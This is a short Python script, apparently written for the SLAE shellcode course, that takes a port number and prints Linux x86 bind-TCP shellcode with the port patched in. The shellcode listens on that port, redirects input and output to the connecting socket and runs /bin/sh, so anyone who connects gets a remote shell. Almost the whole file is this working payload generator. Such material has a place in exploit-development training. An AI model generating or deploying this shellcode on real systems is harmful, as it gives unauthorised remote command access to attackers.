#!/usr/bin/env python3

# Author: Jacob Homberg
# Assignment: Shell_Bind_TCP
# SLAE - 1049
# Website - http://somewhatsec.wordpress.com

import sys

if (len(sys.argv) != 2):
	print("[+] The syntax is ./Shell_Bind_TCP_Wrapper [PORT NUMBER]")
	print("[+] Please revise your command and try again")
else:
	try:
		port = int(sys.argv[1])
		if port > 65535:
			print("[+] This is not a valid port. Port numbers between 1024 and 65535 are accepted")
			exit()
		if port < 1024:
			print("[+] This port is in the commonly used port range. Try picking one between 1024 and 65535")
			exit()
		hexval = hex(port)[2:]
		if len(hexval) < 4:
			hexval = "0" + hexval
		print("[+] The Hex value of the port entered is: " + hexval)
		byte1 = hexval[0:2]
		byte2 = hexval[2:4]
		

		if byte1 == "00" or byte2 == "00":
			print("[+] Failed due to null byte. Please select a different port and try again.")
			exit()
		if len(byte1) <2:
			byte1  = "\\x0" + byte1
		if len(byte1) == 2:
			byte1 = "\\x" + byte1
		if len(byte2) <2:
			byte2 = "\\x0" + byte2
		if len(byte2) == 2:
			byte2 = "\\x" + byte2

		scPort = byte1 + byte2

		print("[+] Shellcode Port: " + scPort)
		
		shellcode = ("\\x31\\xc0\\x50\\x40\\x50\\x5b\\x50\\x40\\x50\\xb0\\x66\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x5b\\x58\\x66\\xb8"
			+ scPort + "\\x66\\x50\\x66\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x10\\x50\\x51\\x57\\xb0\\x66\\x89\\xe1\\xcd\\x80\\x50"
			"\\x57\\xb0\\x66\\xb3\\x04\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x03\\xb0\\x3f\\x49"
			"\\xcd\\x80\\x75\\xf9\\xd6\\x89\\xc1\\x89\\xc2\\x50\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
			"\\x89\\xe3\\xcd\\x80")
		print("[+] Resulting Shellcode: \n" + shellcode)
	except:
		print("[+] There has been an issue...")

